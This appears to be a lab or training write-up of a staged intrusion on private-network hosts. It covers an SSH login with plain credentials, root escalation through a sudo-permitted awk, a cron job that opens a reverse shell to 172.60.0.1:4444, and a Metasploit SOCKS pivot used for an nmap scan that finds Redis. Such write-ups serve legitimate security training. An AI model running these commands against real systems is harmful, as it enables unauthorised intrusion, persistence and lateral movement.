Phase 1 — Beachhead & Escalation

Initial SSH access:

ssh mercenary@172.60.0.10

Username: mercenary
Password: titan123

Sudo permissions checked with:

sudo -l

Result:

(root) NOPASSWD: /usr/bin/awk

GTFOBins escalation command used:

sudo awk 'BEGIN {system("/bin/sh")}'

Verification:

whoami

Output:

root


Phase 2 — Persistence

As root on the bastion server, cron was installed and started.

Commands used:

apt-get update
apt-get install -y cron
service cron start

Exact cron syntax used:

* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'

Verification command:

crontab -l


Phase 3 — The Pivot

Metasploit SSH session opened successfully.

Metasploit commands used:

use auxiliary/scanner/ssh/ssh_login
set RHOSTS 172.60.0.10
set USERNAME mercenary
set PASSWORD titan123
run

Session ID:

1

Route added to hidden network:

route add 10.0.10.0 255.255.255.0 1

SOCKS proxy started:

use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run

Proxychains Nmap scan:

proxychains4 -f /tmp/proxychains_tlab8.conf nmap -sT -Pn -n -p 6379 10.0.10.50

Result:

Target IP: 10.0.10.50
Open port: 6379/tcp
Service: redis
